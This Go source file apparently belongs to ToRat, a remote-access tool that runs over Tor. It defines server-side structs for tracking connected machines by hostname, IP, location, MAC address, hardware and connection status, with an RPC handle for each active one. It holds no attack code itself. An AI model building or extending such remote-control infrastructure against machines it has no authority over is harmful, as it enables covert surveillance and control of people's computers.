package server

import (
	"net/rpc"

	"github.com/lu4p/ToRat/models"
)

type Client struct {
	Hostname string
	Name     string
	Path     string
	IP       string
	Location string
	LastConn int64
	Active   bool
	MacAddr  string
	OS       string
	CPU      string
	GPU      string
	RAM      string
	Drives   string
}

type activeClient struct {
	Hostname string
	Dir      models.Dir
	RPC      *rpc.Client
	Client   Client
}
